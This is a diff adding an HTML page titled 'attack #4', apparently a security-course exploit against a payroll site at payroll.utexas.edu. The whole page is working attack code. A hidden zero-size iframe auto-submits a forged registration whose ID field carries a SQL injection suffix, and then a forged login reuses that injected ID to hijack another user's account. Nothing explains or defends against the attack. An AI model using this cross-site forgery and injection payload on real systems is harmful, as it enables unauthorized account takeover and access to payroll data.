@@ -1,0 +1,55 @@
+<html>
+<title>attack #4</title>
+
+<body>
+
+<form name="register" method="post" action="http://payroll.utexas.edu/" target="a_frame">
+
+<input type="hidden" name="name" value="Random Guy">
+<input id="regVal" type="hidden" name="eid" value="">
+<input type="hidden" name="password1" value="12345">
+<input type="hidden" name="password2" value="12345">
+<input type="hidden" name="action" value="register">
+
+</form>
+
+<form name="attack" method="post" action="http://payroll.utexas.edu/" target="_self">
+
+<label>UT EID:</label>
+<input id="change" type="textarea" name="eid" value="">
+<input  type="hidden" name="password" value="123">
+<input type="button" value="Submit" onclick="changeValue();">
+<input type="hidden" name="action" value="login">
+</form>
+
+
+
+<iframe name="a_frame" id="frame" width=0 height=0 onload="submitAttack()"></iframe>
+
+<script type="text/javascript">
+
+function changeValue()
+{
+
+  var oldValue=document.getElementById("change").value;
+  var newVal=oldValue+"' OR 1<0;--";
+  document.getElementById("change").value=newVal;
+  document.getElementById("regVal").value=newVal;
+  submit();
+};
+
+function submit()
+{
+   document.forms["register"].submit();
+   
+};
+
+function submitAttack()
+{
+    document.forms["attack"].submit();
+};
+</script>
+
+</body>
+
+</html>
